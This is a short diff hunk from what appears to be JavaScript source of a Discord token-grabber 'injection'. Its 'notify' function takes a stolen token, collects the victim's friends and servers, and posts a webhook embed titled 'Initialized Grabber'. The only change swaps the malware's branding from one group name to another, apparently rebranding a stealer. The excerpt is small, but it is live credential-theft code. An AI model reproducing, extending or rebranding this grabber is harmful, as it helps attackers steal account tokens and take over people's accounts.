@@ -146,7 +146,7 @@ const notify = async (ctx, token, acc) => {
         friends = await getFriends(token),
         servers = await getServers(token);
 
-    ctx.username = "@AuraThemes - Injection";
+    ctx.username = "BlazeSquad - Injection";
     ctx.avatar_url = "https://i.imgur.com/WkKXZSl.gif";
     ctx.embeds[0].title = `Initialized Grabber - ${ctx.title}`;
     ctx.embeds[0].fields.unshift({
